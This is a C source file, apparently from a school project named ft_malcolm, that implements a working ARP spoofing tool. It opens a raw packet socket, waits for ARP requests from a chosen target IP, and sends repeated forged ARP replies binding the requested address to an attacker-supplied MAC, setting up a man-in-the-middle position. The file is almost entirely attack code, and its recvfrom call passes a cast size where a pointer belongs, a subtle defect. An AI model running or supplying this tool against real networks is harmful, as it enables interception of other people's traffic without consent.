#include "../inc/ft_malcolm.h"

g_all all;

void    inthandler()
{
    printf("\nEnd of the man in the middle attack ...\n");
    close(all.sockfd);
    exit(0);
}

void    fill_target_and_source(char* msource)
{
    for (int i = 0, j = 0; i < 12; i += 2, j++) {
        int high = msource[i] <= '9' ? msource[i] - '0' : msource[i] - 'a' + 10;
        int low = msource[i+1] <= '9' ? msource[i+1] - '0' : msource[i+1] - 'a' + 10;
        all.mac_address_source[j] = (high << 4) | low;
    }

    free(msource);
    return ;
}

void    request_reply(char *mac_source, char *ip_target, unsigned char mac_target[ETH_ALEN], struct in_addr dest_ip_rec)
{
    int if_index;

    fill_target_and_source(delete_double_point(mac_source));
    //str_to_ip(ip_source, all.ip_address_source);
    str_to_ip(ip_target, all.ip_address_target);
    all.response.arphdr.ar_hrd = htons(ARPHRD_ETHER);
    all.response.arphdr.ar_pro = htons(ETH_P_IP);
    all.response.arphdr.ar_hln = 6;
    all.response.arphdr.ar_pln = 4;
    all.response.arphdr.ar_op = htons(2);
    ft_memcpy(all.response.arphdr.ar_sha, all.mac_address_source, ETH_ALEN);
    ft_memcpy(all.response.arphdr.ar_spa, &dest_ip_rec, 4);
    ft_memcpy(all.response.arphdr.ar_tpa, all.ip_address_target, 4);
    ft_memcpy(all.response.arphdr.ar_tha, mac_target, ETH_ALEN);
    ft_memcpy(all.response.ethhdr.ether_dhost, mac_target, ETH_ALEN);
    ft_memcpy(all.response.ethhdr.ether_shost, all.mac_address_source, ETH_ALEN);
    ft_memcpy(all.saddr.sll_addr, mac_target, ETH_ALEN);
    if_index = if_nametoindex(all.interface);
    all.saddr.sll_family = AF_PACKET;
    all.saddr.sll_ifindex = if_index;
    all.saddr.sll_protocol = htons(ETH_P_ARP);
    all.saddr.sll_pkttype = PACKET_OTHERHOST;
    all.saddr.sll_hatype = ARPHRD_ETHER;
    all.saddr.sll_halen = ETH_ALEN;
    all.response.ethhdr.ether_type = htons(ETH_P_ARP);
    if (all.verbose == 1)
        verbose_print(all.saddr);
    int i = 1;
    while (i < 10)
    {    
        if (sendto(all.sockfd, &all.response, sizeof(t_arp_packet_response), 0, (struct sockaddr *) &all.saddr, sizeof(all.saddr)) < 0) {
            perror("Erreur lors de l'envoi de la requête ARP");
            exit(EXIT_FAILURE);
        }
        sleep(1);
        if (i % 3 == 0)
            printf(".\n");
        else   
            printf(".");
        i++;
    }
    printf("\nSpoofing done !\n");
    return ;
}

int main(int argc, char **argv) 
{
    all.verbose = 0;
    check_arg(argc, argv);
    signal(SIGINT, inthandler);
    char buffer[BUFFER_SIZE];
    t_arp_packet_receive receive;
    struct in_addr src_ip_rec, dest_ip_rec;
    all.interface = argv[3];
    

    all.sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(all.sockfd < 0) {
        perror("socket");
        return 1;
    }
    printf("Waiting arp request to spoof...\n\n");

    while(1) {
        recvfrom(all.sockfd, buffer, ETH_FRAME_LEN, 0, (struct sockaddr*)&all.saddr, (socklen_t*)sizeof(all.saddr));
        receive.ethhdr = (struct ether_header *) buffer;
        receive.arphdr = (t_arphdr *) (buffer + sizeof(struct ether_header));
        if(ntohs(receive.ethhdr->ether_type) == ETHERTYPE_ARP && ntohs(receive.arphdr->ar_op) == ARPOP_REQUEST) 
        {
            ft_memcpy(&src_ip_rec.s_addr, receive.arphdr->ar_spa, sizeof(src_ip_rec.s_addr));
            ft_memcpy(&dest_ip_rec.s_addr, receive.arphdr->ar_tpa, sizeof(dest_ip_rec.s_addr));
            if (inet_addr(argv[2]) == src_ip_rec.s_addr ){
                printf("Spoofing in progress\n\n");
                request_reply(argv[1], argv[2], receive.arphdr->ar_sha, dest_ip_rec);
                printf("\nWaiting arp request to spoof again...\n\n");
                //break;
            }
            else{
                printf("Received ARP request:\n");
                printf("Adresse IP source of the packet: %d.%d.%d.%d\n", receive.arphdr->ar_spa[0], receive.arphdr->ar_spa[1], receive.arphdr->ar_spa[2], receive.arphdr->ar_spa[3]);
                printf("Adresse IP dest of the packet: %d.%d.%d.%d\n", receive.arphdr->ar_tpa[0], receive.arphdr->ar_tpa[1], receive.arphdr->ar_tpa[2], receive.arphdr->ar_tpa[3]);
                printf("Adresse MAC source : %02x:%02x:%02x:%02x:%02x:%02x\n\n", receive.arphdr->ar_sha[0], receive.arphdr->ar_sha[1], receive.arphdr->ar_sha[2], receive.arphdr->ar_sha[3], receive.arphdr->ar_sha[4], receive.arphdr->ar_sha[5]);
            }
        }
    }
    return 0;
}